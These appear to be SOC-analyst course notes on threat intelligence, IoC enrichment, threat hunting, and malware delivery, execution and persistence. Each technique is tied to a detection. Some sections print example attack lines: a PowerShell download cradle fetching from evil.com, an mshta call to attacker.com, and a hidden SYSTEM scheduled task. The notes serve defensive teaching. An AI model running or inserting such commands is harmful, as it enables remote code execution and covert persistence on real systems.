    Feed sources: Open Source / OSINT (AlienVault OTX, Abuse.ch), Commercial (Recorded Future, ThreatConnect), ISACs / Government (FS-ISAC, CISA), Internal (honeypots, IR reports).

    Pipeline: Collection → TIP → SIEM. SIEM enrichment adds CTI data to raw logs; detection logic triggers alerts on IOC / TTP matches; SOAR uses CTI to prioritize and automate the response.

    IOC-based detection: IP / URL / hash matching, GeoIP & ASN-based risk scoring, expiry- and context-based IOC filtering.

    TTP-based detection: ATT&CK-aligned rules (e.g., detecting credential dumping), threat behaviors tied to known adversaries, mapping detection coverage to ATT&CK.

    Before / after example — moving from static to context-aware detection:

    • Before: IF src_ip == x.x.x.x THEN alert
    • After: IF src_ip IN [Threat Feed] AND Threat_Level >= 7 AND NOT PreviouslySeen THEN alert with context

    SOAR's role: enrich alerts with threat actor data, automate blocking in the firewall, prioritize incidents based on threat scoring.

    Success metrics: reduction in false positives, Mean Time to Detection (MTTD), coverage of known threats, analyst feedback.

    Common pitfalls: too much noise from low-quality feeds, stale IoCs, over-reliance on atomic indicators, poor correlation with the local environment.

    Best practices: use vetted, high-confidence feeds; apply context (malware family, campaign); regularly tune detection rules; automate IoC expiration; feed CTI back from IR teams (closed loops).

    5-stage CTI maturity model: Ad hoc CTI lookup → IoC ingestion into SIEM → Detection rule tuning → Behavioral analytics → Full SOAR-based response.

    Key takeaways: integration is key to making CTI actionable; SIEMs benefit from high-quality intel plus context; automation supercharges response; CTI is not just IoC matching — think behavior, context, threat actor.

  2. 4.2

    IoC Enrichment & Contextualization

    Common challenges without enrichment: lack of context, high false positives, no prioritization, blind spots in response.

    The enrichment wheel around an IoC: WHOIS (registrant, creation date), Passive DNS (historic domains), Related hashes and malware families, Reputational Data (VirusTotal score), GeoIP (country, ISP).

    Contextualizing questions:

    • Is this part of a known campaign?
    • What stage of the attack does it relate to?
    • Does this affect my industry?

    Worked example: a SOC alert fires for outbound traffic to 34.117.59.81. Enrichment reveals: WHOIS shows it belongs to Google Cloud; GreyNoise shows it scanning SSH globally; VirusTotal flags it malicious in 3 engines; Passive DNS shows it previously resolved from akudate.evilcorp[.]com; sandbox analysis shows it dropped an Emotet payload. Contextualizing all of that together: this is likely C2 infrastructure, previously used by an Emotet variant, seen in phishing campaigns in the past 7 days, and associated with TTPs linked to TA542.

    Pipeline: IoC → Enrichment Layer → Context Layer → Outputs (Detection Engineering, Threat Hunting, Reporting / Intel Feeds, Incident Response).

    Sources:

    • Internal — SIEM, IR logs, sandbox detonation.
    • External — VirusTotal, PassiveTotal, MISP, AbuseIPDB, AlienVault OTX, Shodan.

    Mapping ATT&CK tactics to IoC types:

  3. 4.3

    Intelligence-Driven Threat Hunting

    Raw data ≠ meaningful detection — intelligence provides direction. Focused hunts reduce wasted effort and blind spots, bring hunting in line with real-world threats (APT groups, malware campaigns), and support prioritization based on likelihood, relevance, and potential impact.

    Sources by level: strategic to tactical intel all matter, but prioritize technical and TTP-based indicators; sources include OSINT feeds, commercial feeds, sector ISACs / CISA alerts, and internal telemetry (previous IR cases, phishing reports).

    Building a hypothesis from intel: "If [actor / tool] targets organizations like ours, we might see [behavior] in [data source]." Example: "If Volt Typhoon is targeting ICS systems, are there WMI events in the Windows IT system logs?" This reinforces a proactive, analytical mindset.

    ATT&CK-based hunting: convert intel to behaviors via ATT&CK techniques. Benefits: TTP-based hunting scales better than IOC-based hunting, and produces reusable detection content across environments. Tools: ATT&CK Navigator, Unfetter, ThreatMapper.

    Visibility needed: Endpoints (EDR, logs, AV), Authentication (Windows Events, AD logs), Network (NetFlow data, proxy, DNS), Cloud (CloudTrail, GCP logs). Tool examples: Splunk, ELK, Velociraptor, Sigma rules, EQL.

    6-step hunting process:

    1. Ingest and contextualize threat intel

      Start with relevant, timely intel.

    2. Create a hypothesis from a relevant actor / tool

      Ground it in real observed behavior.

    3. Map to ATT&CK techniques

      Translate the hypothesis into detectable behavior.

    4. Build hunt queries / detections

      Prepare the specific queries.

    5. Validate with real data

      Run and confirm against telemetry.

    6. Feed results into IR / SIEM / detection

      Close the loop into operations.

    Worked example — TA551: Intel shows TA551 uses Excel macros → RDP → Cobalt Strike. Hypothesis: look for Excel spawning unusual child processes. TTP mapping: T1204.002 (User Execution), T1059.005 (VBScript), T1219 (Remote Access Software). Action: hunt EDR logs for excel.exe spawning powershell.exe, followed by outbound C2.

    After the hunt: refine detections & SIEM rules; share TTP observations with SOC / IR; feed context back into the TIP or wiki; update adversary playbooks or threat models.

    Traditional vs. intelligence-driven hunting:

    FeatureTraditionalIntelligence-Driven
    ScopeBroad, unfocusedScoped to threats
    DriversGut feeling, anomaliesAdversary behaviors, intel
    OutputsAlerts, anomaliesDetections, context, enrichment
    EfficiencyVariesHigh (targeted effort)

    Building repeatable workflows: templates for hypothesis generation, ATT&CK-mapped detection libraries, threat-actor tagging in logs, and integration with SOC / IR feedback loops so hunting is part of daily ops, not a side project.

    Threat Hunting Maturity for an organization:

    • Level 1 — IOC-based reactive hunts.
    • Level 2 — behaviorally focused TTP hunts.
    • Level 3 — fully integrated, intelligence-driven, adversary-informed hunting cycles.

Sources, Standards & Collaborative Sharing

  1. 5.1

    Threat Intelligence Sources
    • OSINT (Open-Source Intelligence) — GitHub, Twitter / X, Reddit, VirusTotal, blogs, Pastebin, etc.
      • Strengths: free and abundant, diverse (social media / public malware repos / blogs), real-time and community-driven.
      • Weaknesses: high noise-to-signal ratio, often unauthenticated / unverified, susceptible to disinformation or manipulation.
    • Commercial Feeds — Mandiant, Recorded Future, Flashpoint, Palo Alto Unit 42, etc.
      • Strengths: curated, enriched, usually vetted; often come with support or threat-actor tracking; SLAs and integrations with SIEM / TIP / SOAR.
      • Weaknesses: expensive (may overlap with OSINT); risk of a "vendor echo chamber" where everyone shares the same indicators.
    • Closed Sources — government agencies, sector-specific ISACs.
      • Strengths: highly exclusive (government intel, industry-specific trust groups, dark web infiltrations), can provide early warning or high-confidence intelligence.
      • Weaknesses: hard to access (clearance, trust, vetting), little transparency into collection methods.

    The best intelligence comes from correlating across sources. Example: OSINT detects a new phishing domain → a commercial feed matches the infrastructure to a known APT → a closed source confirms campaign targeting via classified alerts.

    Evaluation questions: What's the source's collection methodology? Can it be actioned? Is it redundant or unique?

    Worked timeline comparison (a hypothetical December incident):

    1. Dec 9 — OSINT

      Tweets leak an exploit, GitHub PoCs drop, Minecraft servers get tested — fast, noisy alerts; crowd-sourced awareness.

    2. Dec 10 — Commercial feeds

      YARA / Sigma rules released, initial TTP attribution, endpoint detection guidance — structured detections; context from experts.

    3. Dec 11 — Closed sources

      Alerts to critical infrastructure organizations, early ransomware warnings, nation-state actor reports — strategic response; trusted sector coordination.

    "Speed + Structure + Strategy = Resilience."

    Strategic decisions: Build vs. Buy vs. Borrow; use TIPs and automation to reduce overload; create internal policies for validation and usage.

  2. 5.2

    STIX, TAXII & TLP
    • STIX (Structured Threat Information eXpression) is Structured (defined schema for consistency), Descriptive (captures indicators, actors, malware), Relational (links objects like "Malware used by Actor"), and Machine Readable (written in JSON for automated parsing).
    • TAXII (Trusted Automated eXchange of Indicator Information) is a Transport Protocol (moves STIX data between systems securely / reliably), a Standardized API (HTTP/S and RESTful endpoints), supports Push & Pull (push to subscribers or let consumers pull on demand), organizes intel via Collections & Channels (topic-based containers), and is Designed for Automation (machine-to-machine sharing in real time or on schedule).
    • TLP (Traffic Light Protocol) levels:
      • TLP:RED — for named recipients only; do not share.
      • TLP:AMBER — limited disclosure, only to those who need to know within your organization.
      • TLP:GREEN — share with peers and partners within your community.
      • TLP:CLEAR — no restrictions; may be shared publicly.

    How they relate: STIX provides the data format; TAXII provides the transport mechanism; TLP provides the handling and dissemination guidance. In short: STIX = what is shared, TAXII = how it's shared, TLP = who it's shared with.

  3. 5.3

    Structured Analytical Techniques & Cognitive Bias

    Structured Analytical Techniques (SATs) = formalized methods used to improve critical thinking and analysis. Purpose: examine assumptions, identify gaps and contradictions, minimize biases, consider alternative hypotheses.

    7 SATs, each addressing a different weak point in analysis:

    1. Analysis of Competing Hypotheses (ACH) — a matrix-based technique for comparing multiple hypotheses against evidence to see which is most consistent.
    2. Key Assumptions Check — a technique to identify and challenge the assumptions that underpin your analysis.
    3. Red Team Analysis — analysts take on the role of the adversary to understand their objectives, constraints, and likely next moves.
    4. Indicators and Signposts of Change — a method to monitor whether your hypothesis continues to be supported over time.
    5. Timeline / Chronology Mapping — organizes events in time to find gaps, triggers, or patterns suggesting causality or coordinated activity.
    6. Mind Mapping / Link Analysis — visually connects people, infrastructure, malware, behaviors, and events.
    7. Devil's Advocacy — deliberately arguing against the prevailing analysis to find its weaknesses.

    Why SATs matter in CTI — they counter deception, confirmation bias, time pressure, and financial risk in the analysis process.

    7 cognitive biases that undermine intelligence analysis:

    BiasWhat it isWhy it mattersMitigation
    Confirmation Bias Tendency to favor or interpret information that supports existing beliefs Poor attribution, blind spots, misidentification of TTPs Analysis of Competing Hypotheses
    Anchoring Bias Relying too heavily on the first piece of information received Skews analysis toward viewing further evidence through that lens Key Assumptions Check
    Mirror Imaging Assuming the adversary thinks, prioritizes, or acts the way you might Flawed threat modeling, misjudging adversary goals / tactics Red Team Analysis
    Availability Bias Reliance on recent, vivid, or easily recalled events instead of actual probability / relevance Overweights recent / high-profile attacks, ignores broader trends and low-visibility threats Timelines & Historical Analysis
    Groupthink Pressure to conform to consensus opinions within a team, suppressing dissent Prevents challenging flawed assessments, reduces creativity, can cause analytic failures Devil's Advocacy or Structured Team Debate
    Satisficing Stopping at the first "good enough" answer instead of exploring better explanations Shallow analysis, missed threats Indicators and Signposts of Change
    Overconfidence Overestimating the accuracy, completeness, or value of one's own analysis Rigid assessments, poor stakeholder communication, disregard for new evidence Confidence Rating Frameworks + Peer Review

    Key takeaways: SATs are tools for thinking critically under pressure; cognitive biases are hidden obstacles that can derail judgment; combining SATs with bias awareness builds more rigorous, transparent, and actionable threat intelligence.

  4. 5.4

    ISACs & Collaborative Sharing

    ISACs (Information Sharing and Analysis Centers) trace back to Presidential Decision Directive 63; they're non-profit, member-driven organizations focused on critical infrastructure protection. Major ISACs by sector: Financial, Healthcare, Energy, IT, Auto, Multi-State Government, Aviation.

    How threat data flows: ingested by cleared analysts, technical platforms, and real-time feeds; then data enrichment; then data redistribution.

    Bridging public and private sectors: enables rapid sharing of classified and unclassified cyber threat data, mutual coordination, and resilience / recovery support.

    Federal players: CISA, NSA Cybersecurity Directorate, FBI InfraGard, DoD / DC3, DOE / HHS / DOT / Treasury, USSS Electronic Crimes Task Force, USSS Cyber Fraud Task Forces.

    Mechanics of sharing: TLP labels control distribution, packaged as STIX, pushed / pulled via TAXII, integrated into SIEMs (Elastic, Splunk), TIPs (ThreatConnect, MISP, Anomali), and SOAR platforms.

    Real coordination examples:

    • SolarWinds (2020) — NSA detected lateral movement; Microsoft and FireEye discovered the supply chain compromise; CISA coordinated disclosure and mitigation; a STIX package with SUNBURST IOCs was shared.
    • Colonial Pipeline (2021) — FS-ISAC shared threat indicators related to DarkSide; MS-ISAC disseminated guidance to SLTT agencies; DHS / CISA coordinated private briefings for the utility sector.

    Getting started: join an ISAC relevant to your sector; set up automated sharing (configure TIPs with STIX / TAXII access, ingest MISP feeds into SIEMs); build relationships; share intelligence, not just consume it.

    CTI across levels:

    • Strategic — nation-state cyberwarfare and deterrence.
    • Operational — impact analysis across organizations.
    • Tactical — lateral-movement techniques, propagation methods.

Introduction to Malware

  1. 1.1

    What is Malware?

    Malware = Malicious + Software — software intentionally designed to cause damage, gain unauthorized access, disrupt operations, or steal information.

    Key characteristics: operates without the user's informed consent; serves the attacker's objectives, not the user's; ranges from a single script to a complex multi-stage operation; may be persistent (survives reboot) or memory-resident only (disappears on reboot).

    The purpose of malware:

    FunctionWhat it doesExample
    AccessEstablish a footholdRAT, Web shell
    PersistenceLong-term presence (survive reboots)Rootkits, registry backdoor
    CollectionHarvest credentials, keystrokes, filesKeylogger
    ExfiltrationMove stolen dataDNS tunneling tools
    DisruptionDeny access to system or dataRansomware, wiper
    PropagationSpread to other hosts or networkWorm
    DeliveryDownload and execute additional payloadsDropper

    Malware evolves — Then vs. Now: Then = standalone malware, one binary / one function, signature-based detection was effective. Now = multi-stage attack chains with modular payloads, cybercrime-as-a-service ecosystems, fileless techniques, sandbox-aware / packed / obfuscated / polymorphic samples.

    Why malware knowledge helps a SOC analyst: triage faster (recognize what you're looking at), reduce false positives (differentiate malware from benign anomalies), extract actionable IoCs (hashes, IPs, domains to feed detection tools), communicate clearly (especially when escalating to Tier 3 / management), contextualize alerts (map to MITRE ATT&CK to predict the next move), make better containment decisions (how it spreads, what C2, how to isolate).

  3. 1.3

    Attacker Motivations

    Why motivation matters for SOC analysts: motivation shapes the malware used (financially motivated attackers use different tools than nation-state espionage operators); motivation predicts behavior (knowing the goal lets you anticipate next steps in the kill chain); motivation informs severity (an info-stealer targeting browser creds is serious — the same stealer targeting classified defense data is a different conversation); motivation guides escalation urgency.

    Financial Gain — the dominant motivation today. Common malware: ransomware (direct extortion), info-stealers (credential theft → account takeover → fraud), banking trojans (intercept transactions), cryptominers, botnets (sold / rented as infrastructure-as-a-service). Characteristics: high-volume opportunistic targeting (spray and pray), increasingly professionalized (RaaS platforms, affiliate programs, victim "customer support"), short dwell time (monetize quickly), will hit any industry that can pay. SOC implication: most alerts you triage will be financially motivated; speed of response directly impacts financial loss.

    Espionage — long-term, stealthy access to steal sensitive information. Common malware: custom RATs / backdoors, rootkits (long-term stealth), fileless malware (minimize forensic footprint), modular frameworks (Cobalt Strike, custom C2). Characteristics: highly targeted, long dwell time, sophisticated evasion, gradual / staged exfiltration, targets government / defense / tech / critical infrastructure / research. SOC implication: the hardest to detect — low-and-slow C2 beaconing, subtle data staging, legitimate-tool abuse; escalate to IR and threat intel immediately if you spot targeted-espionage indicators.

    Hacktivism — disruption or embarrassment to advance a political / social / ideological cause. Common malware: DDoS tools and botnets, website defacement tools, data-exfiltration tools (for public leaks), wipers (in more extreme cases). Characteristics: often publicly claimed, targets chosen for symbolic value, technical sophistication varies widely, timing correlates with political events / protests. SOC implication: monitor for DDoS / defacement during heightened geopolitical tension or public spotlight — campaigns are often noisy but can occasionally involve real data compromise.

    Destruction — the goal is damage, not money / data / access. Common malware: wipers (MBR overwrite, file destruction), pseudo-ransomware (looks like ransomware but has no working decryption), sabotage malware targeting ICS / SCADA. Characteristics: often deployed during armed conflicts / geopolitical crises, may be disguised as ransomware to buy time, targets critical infrastructure / government / energy / transportation, irreversible damage (no key to buy, no negotiation possible). SOC implication: treat any suspected wiper as maximum severity. Example: a 2020 case where an extortion note claimed 2TB exfiltrated, but the customer's internet was 25 Mbps and logs showed only ~6 hours of C2 connection — a fabricated claim worth catching.

    Nation-State — the full spectrum (espionage, disruption, destruction, influence), backed by government resources. What makes it different: access to zero-days and custom tooling, dedicated development teams maintaining malware over years, operational patience (willing to wait months before acting), strategic target selection aligned with national interests, and attribution is often politically impossible. SOC implication: you likely won't identify a nation-state actor from a single alert, but patterns (unusual targeting, custom tooling, sophisticated evasion) should raise the question — when in doubt, engage threat intelligence.

02

Malware Delivery and Execution

  1. 2.1

    The Infection Chain

    Every malware infection must complete three phases:

    1. Delivery

      How does it reach the target?

    2. Execution

      How does it run?

    3. Persistence

      How does it survive reboots?

    Each phase is a detection opportunity — understanding all three means you can catch an attack at any point, not just when the final payload detonates. Like a package bomb: someone has to deliver it, someone has to open it, and the attacker may have hidden a second device to go off later. Disrupting any single phase stops the attack.

  2. 2.2

    Delivery Vectors

    Email-Based Delivery — the most common delivery vector by a wide margin. Two categories:

    • Malicious Attachments — Office docs with macros (.docm / .xlsm / .doc / .xls); archives with executables (.zip / .rar / .7z / .iso / .img); HTML smuggling files (.html / .htm that reconstruct payloads in-browser); shortcut files (.lnk executing hidden commands); PDFs with embedded JS / links; OneNote (.one) files with embedded scripts.
    • Malicious Links — URLs to credential-harvesting pages, links to hosted payloads / drive-by downloads, links to legitimate file-sharing services hosting malware, QR codes directing to malicious URLs ("quishing").

    SOC relevance: email is your main alert source for initial access; look for spoofed / newly-registered sender domains, password-protected attachments (a common evasion tactic), mismatched extensions, excessive-redirect URLs; Microsoft's default macro block (2022+) shifted attackers to ISO / LNK / OneNote / HTML smuggling — stay current on evolving formats.

    Drive-By Downloads — malware delivered just by visiting a compromised / malicious site, no interaction needed beyond browsing. Common exploit-kit flow: user visits a compromised site → hidden iframe / redirect → EK landing page → EK fingerprints browser / OS / plugins → EK serves a tailored exploit → exploit downloads and executes the payload. SOC relevance: exploit kits have declined since Flash / Java were retired but still exist; modern drive-bys increasingly use social-engineering overlays ("your browser is out of date") rather than silent exploits; look for unexpected browser child processes, downloads from unfamiliar domains right after browsing, suspicious proxy-log redirects.

    Watering Hole Attacks — attacker compromises sites the target group visits frequently (industry forums, professional associations, gov portals), injecting malicious code; may target only visitors matching specific criteria (IP range, geolocation, browser language). Effective because the victim trusts the site they visit regularly, selective targeting makes detection harder, and it's particularly effective against specific industries / organizations. SOC relevance: commonly associated with espionage / APT campaigns; look for unusual requests from trusted / bookmarked sites; if threat intel reports a watering hole on a site your org visits, check proxy logs immediately for the compromise window.

    Supply Chain Compromises — attack vectors: software updates (compromising a vendor's build infra, e.g. SolarWinds), open-source dependencies (typosquatted or maintainer-compromised packages on npm / PyPI / RubyGems), hardware / firmware (pre-installed malware before it reaches the customer), MSPs (compromising a managed service provider to reach all downstream clients). Devastating because malware arrives through a trusted channel (signed, via official update mechanisms), traditional perimeter defenses won't catch it, and the blast radius is enormous. SOC relevance: rare but catastrophic; monitor vendor security advisories and threat intel; look for unexpected behavior from recently updated trusted software, new connections from apps with previously predictable patterns; maintain a software inventory.

    Removable Media — planted devices (dropped in parking lots / lobbies or mailed as promotional items), autorun exploitation (historically, largely mitigated in modern Windows), BadUSB / Rubber Ducky (devices emulating a keyboard, typing at machine speed), infected shared media passed between employees / partners. SOC relevance: less common than email but still relevant for air-gapped networks, manufacturing, and critical infrastructure; look for USB connection events, executables running from removable-media paths, new device types in asset management; org USB policy (block / alert / allow) directly affects your risk exposure.

    Social Engineering as a Delivery Enabler — not a separate delivery mechanism, but the force multiplier that makes every other mechanism work. Techniques: Urgency ("act now or your account will be locked"), Authority (impersonating executives / IT / law enforcement), Trust (spoofing known senders or compromising real accounts), Curiosity (enticing filenames like Salary_Review_2025.xlsx), Fear ("your system is infected, download this tool immediately"). SOC relevance: when triaging email alerts, evaluate social-engineering quality — a well-crafted spear-phish targeting your CFO is a different threat level than a mass-mailed "Dear Customer" phish with broken English.

  3. 2.3

    Execution Techniques

    The execution challenge: modern OSes and security tools create multiple barriers — UAC prompts, application whitelisting, Microsoft's macro block, AV / EDR scanning on write and execution, SmartScreen warnings. Attackers develop execution techniques specifically to bypass these.

    Macro-Enabled Documents — a doc with embedded VBA macro code that runs automatically on open (Auto_Open, Document_Open); macro code typically downloads / executes the next-stage payload or drops an embedded payload to disk. Common behaviors: calling PowerShell / cmd to download a payload, writing an embedded executable to %TEMP% and executing it, using WMI to spawn a process (avoiding a direct Office child process), decoding obfuscated strings at runtime. Current state (post-2022): Microsoft now blocks macros by default in internet-sourced files (Mark of the Web); attackers adapted via ISO / IMG containers (strip MOTW), OneNote files, or socially engineering users to manually remove the block; macro-based attacks have declined but are not extinct, especially against orgs with older Office or permissive policies. SOC relevance: classic alert pattern is WINWORD.EXE => cmd.exe => powershell.exe => payload; check your macro policy — if macros are fully blocked, macro alerts may indicate policy bypass or legacy systems.

    PowerShell-Based Execution — why attackers love it: pre-installed on every modern Windows system, full access to .NET / Windows APIs, can download / execute / interact with the OS all from one command, easy to obfuscate (encoding, string concatenation, Invoke-Expression). Common malicious patterns:

    • Download cradle — IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1').
    • Encoded command — powershell.exe -EncodedCommand <S0meBASE64EncodedString==>.

    SOC relevance: one of the most abused legitimate tools; key log sources are PowerShell Script Block Logging (Event ID 4104), Module Logging, and Transcription Logging (ensure these are enabled); look for -EncodedCommand, -ExecutionPolicy Bypass, -WindowStyle Hidden, IEX, DownloadString, DownloadFile, Invoke-Expression; context matters — not all PowerShell usage is malicious.

    DLL Sideloading — the attacker identifies a legitimate trusted application that loads a specific DLL, places a malicious DLL with the expected filename in the same directory; when the app runs, Windows loads the attacker's DLL instead of (or before) the legitimate one; the malicious DLL executes under the trusted app's context. Effective because the code runs under a trusted app's name / signature, security tools may whitelist the app while its DLL runs unchecked, it bypasses application whitelisting, and the trusted app still functions normally. Common sideloading targets: signed apps from major vendors that load DLLs from their working directory, portable apps copied to writable locations, and legitimate software bundled with the malware (attacker ships both the trusted .exe and the malicious .dll together). SOC relevance: look for legitimate executables running from unusual locations, trusted apps loading DLLs from non-standard paths, and sideloading-vulnerable applications flagged by threat intel; EDR DLL-load telemetry is your best detection source.

    Living Off the Land Binaries (LOLBins):

    LOLBinLegitimate purposeAbuse case
    powershell.exeScripting and automationDownload cradles, in-memory execution
    cmd.exeCommand shellScript execution, chaining commands
    mshta.exeExecute HTML applicationsExecute remote .hta files with embedded scripts
    certutil.exeCertificate managementDownload files, Base64 decode payloads

    Effective because these are signed Microsoft binaries (inherently trusted), expected to be present / running, blocking them outright would break legitimate functionality, and they enable fileless / near-fileless attack chains. SOC relevance: one of the most common techniques you'll encounter; detection depends on context, not the binary itself (certutil.exe downloading a file is suspicious; certutil.exe managing certificates is normal); focus on unexpected parent-child relationships, unusual command-line arguments, and network connections from tools that shouldn't communicate externally; reference: lolbas-project.github.io.

    Process Injection — why attackers use it: malicious activity appears to come from a trusted process (explorer.exe, svchost.exe), evades process-based detection rules and application whitelisting, inherits the target process's permissions and network access, leaves no malicious executable on disk (code lives only in memory).

  4. 2.4

    Execution Chains — Putting It Together

    1. Chain 1 — classic phishing to payload

      Email → user opens .docm → macro fires → cmd.exe → powershell.exe (download cradle) → payload dropped to %TEMP% → executed.

    2. Chain 2 — HTML smuggling to LOLBin

      Email with .html attachment → browser reconstructs an .iso file → user mounts the ISO → .lnk shortcut → mshta.exe or wscript.exe → downloads payload.

    3. Chain 3 — DLL sideloading package

      Email with .zip attachment → contains a legitimate signed .exe + malicious .dll → user runs the .exe → the .exe loads the malicious .dll → payload executes in the context of the trusted app.

    4. Chain 4 — fileless LOLBin chain

      Email with a link → mshta.exe runs a remote .hta → powershell.exe with an encoded command → in-memory execution → process injection into explorer.exe.

    Why this matters for SOC: alerts often fire on just one link in the chain — your job is to reconstruct the full chain; process-tree analysis in your EDR is the fastest way to map these; each link is both a potential detection point and a clue about what happened before and after.

  5. 2.5

    Persistence Mechanisms

    Registry Run Keys — malware adds a registry value pointing to its executable / script / LOLBin command; everything listed in HKCU runs at user logon, HKLM at system boot; RunOnce entries delete themselves after execution. Key locations: per-user (HKCU\...\CurrentVersion\Run and \RunOnce, no admin needed) and system-wide (HKLM\...\CurrentVersion\Run and \RunOnce, requires admin). Example: HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\eviltask → "C:\Temp\evil.exe". Entries look like anything (often mimicking legitimate software names) pointing to a malware path or a command like powershell.exe -WindowStyle Hidden -File C:\Users\...\evil.ps1. SOC relevance: Autoruns (Sysinternals) is the go-to tool for all autostart locations; look for entries pointing to executables in user-writable directories, obfuscated commands, recently created files, or names mimicking legitimate software but slightly misspelled; registry modification events in EDR / Sysmon Event ID 13 are your primary detection source.

    Scheduled Tasks — created via schtasks.exe, PowerShell, or COM objects; can run at boot / logon / on a timer / on idle / on an event; runs with the permissions of the specified account (can be SYSTEM if the attacker has admin). Example: schtasks /create /tn "WindowsUpdate" /tr "powershell.exe -WindowStyle Hidden -File C:\ProgramData\update.ps1" /sc onlogon /ru SYSTEM. SOC relevance: look for recently created tasks (especially names mimicking system tasks), tasks pointing to executables in unusual locations, tasks running PowerShell / script interpreters, tasks created by unexpected processes; key log sources: Windows Security Event ID 4698 (scheduled task created), Sysmon Event ID 1 (process creation for schtasks.exe); compare task-creation time against the suspected infection timeline.

    Services — attacker creates a new service or modifies an existing one to point to malware; services can auto-start at boot (before logon) and run as SYSTEM by default. Creation methods: sc.exe create, PowerShell New-Service, or direct registry modification under HKLM\SYSTEM\CurrentControlSet\Services. Effective because services start early in boot (before user logon), run at SYSTEM level by default, blend in with hundreds of legitimate services, and can auto-restart if terminated. SOC relevance: look for new services created around the compromise timeframe, services with binaries in unusual locations, generic / suspicious descriptions, unsigned executables; key log sources: Windows System Event ID 7045 (new service installed), Sysmon, EDR service-creation events; use sc query or Autoruns to enumerate and spot anomalies.

    Startup Folders — per-user (C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup) and all-users (C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup, requires admin). Any executable / script / shortcut placed there runs on login, with no registry changes or special commands needed for the per-user folder. SOC relevance: easy to detect since it's a well-known location (check early during triage); look for recently added executables / shortcuts, mismatched extensions, shortcuts pointing to scripts / LOLBins; many commodity malware families still use startup folders because simplicity works; Autoruns includes startup folders in its scan (always a good first check).

    WMI Event Subscriptions — three components:

    • Event Filter — defines the trigger ("when the system boots," "every 60 seconds").
    • Event Consumer — defines the action ("execute this command," "run this script").
    • Filter-to-Consumer Binding — links them together.

    Example trigger conditions: system startup, user logon, specific time intervals, process creation / termination events. What makes it dangerous: no files in obvious persistence locations (no startup folder, no Run key); subscriptions live in the WMI repository, not the file system (some admins never check there); survives reboots; difficult to discover without specific tools / queries. SOC relevance: detection via Sysmon Event ID 19 / 20 / 21 (WMI events), PowerShell Get-WMIObject queries, or dedicated tools like Autoruns (which checks WMI subscriptions).

    DLL Search Order Hijacking — how Windows DLL search order works (simplified): the app's own directory → the system directory (System32) → the 16-bit system directory → the Windows directory → the current directory → directories in PATH. Attackers identify a DLL that an auto-starting application loads from a location the attacker can write to, place a malicious DLL with the same name earlier in the search order, and the app loads the attacker's DLL every time it starts. The persistence angle: if the legitimate app already auto-starts (service, startup item, scheduled task), the attacker gets free persistence — the legitimate app's own autostart mechanism does the work. SOC relevance: particularly stealthy since no new autostart entries are created (existing ones are hijacked); look for DLLs in app directories that don't match expected vendor-signed files, unsigned DLLs loaded by signed applications, DLL creation events around the compromise time; EDR DLL-load telemetry and Sysmon Event ID 7 (Image Loaded) are key detection sources.

  6. 2.6

    Combining It All — Full Worked Scenario

    1. Step 1 — Delivery

      An employee receives an email with a password-protected .zip attachment, impersonating a vendor, with the password in the email body — bypassing email-gateway scanning.

    2. Step 2 — Execution

      Inside the .zip is an .iso file. The user mounts it and sees what appears to be a PDF — actually a .lnk shortcut with a PDF icon. Double-clicking runs a hidden command: mshta.exe http://attacker.com/payload.hta.

    3. Step 3 — Execution chain continues

      The .hta contains JavaScript that launches PowerShell with an encoded command. PowerShell downloads a DLL into %APPDATA% and uses rundll32.exe to execute it.

    4. Step 4 — Persistence

      The malware creates a scheduled task named "MicrosoftEdgeUpdate" that runs rundll32.exe %APPDATA%\msedge.dll,DllMain at every user logon, and also adds a backup registry Run key under HKCU pointing to the same command.

    Detection opportunities across the whole chain:

    • Email gateway — a password-protected attachment from an unknown sender.
    • Endpoint — ISO mount → LNK execution → mshta.exe spawned by explorer.exe.
    • Network — mshta.exe making an outbound HTTP connection.
    • Endpoint — PowerShell with -EncodedCommand launched by mshta.exe.
    • Endpoint — rundll32.exe loading a DLL from %APPDATA%.
    • Persistence — a new scheduled task and a new registry Run key created in rapid succession.

    What L1 vs. L2 Analysts Are Expected To Do

    Tier 1 primary responsibilities:

    • Alert validation — true positive / false positive / benign true positive; check hashes against reputation; review context (trigger, endpoint, user, time).
    • Basic evidence collection — record file hashes MD5 / SHA-1 / SHA-256, note filenames / paths / timestamps, capture the process tree from EDR, screenshot / export alert details.
    • Initial classification — is this known malware, what category, what's the apparent severity.
    • Decision point — close as false positive with documented reasoning; contain and escalate to L2; escalate directly to IR if severity warrants.

    What L1 is NOT expected to do: perform static or dynamic analysis on the sample, deobfuscate scripts or unpack binaries, write YARA rules or custom detections, determine full attack scope across the environment.

    Tier 2 builds on L1 triage:

    • Deeper malware examination — submit samples to sandboxes and interpret behavioral reports, extract strings / IOCs, analyze process trees / execution chains in detail, correlate network IOCs with proxy / firewall logs, perform basic static analysis via PEStudio / file-type verification / import review.
    • Scope assessment — search the environment for the same IOCs (isolated or widespread?), were persistence mechanisms installed?, lateral movement indicators?, what data may have been accessed / exfiltrated?
    • Contextualization — map behaviors to MITRE ATT&CK, cross-reference with threat intel, assess whether it's commodity or potentially targeted.
    • Escalation with confidence — documented analysis with IOCs / timeline / impact, a clear recommendation, enough detail that the next analyst can pick up without starting over.

    What L2 is NOT expected to do: full reverse engineering / disassembly, write custom decryptors / unpackers, conduct deep forensic imaging / analysis, perform threat-actor attribution.

    Triage Analysis (your job) vs. Deep Analysis (escalate when needed):

    Triage — can I: identify what this is using hash lookups / reputation checks? understand what it does using sandbox results and process trees? extract IOCs to search the environment and feed detection rules? determine severity and make an escalation decision? document findings clearly for the next person?

    Escalate to specialists when: the sample is packed / heavily obfuscated and resists triage tools; it's a custom / previously-unknown family with no public intel; sandbox results are inconclusive (evasion suspected); the attack shows targeted / APT indicators; full capability mapping or C2 protocol analysis is needed; legal / regulatory requirements demand forensic-grade analysis.

  3. 3.3

    The "Good Enough" Principle

    Worked example: you get an alert for a suspicious executable on a workstation. In 20 minutes of triage you determine: the hash is flagged by 45/70 AV engines on VirusTotal as an Emotet variant; the sandbox report shows it dropping a DLL in %APPDATA% and beaconing to three external IPs; the process tree shows it launched from an Outlook temp folder; the three C2 IPs match known Emotet infrastructure per threat intel.

    Do you need to reverse-engineer the binary? No. You have enough to confirm it's a true positive (Emotet), isolate the affected host, block the three C2 IPs across the environment, search for those IOCs on other endpoints, and document / escalate for broader response. That's a complete, high-quality SOC response — without ever opening a disassembler.

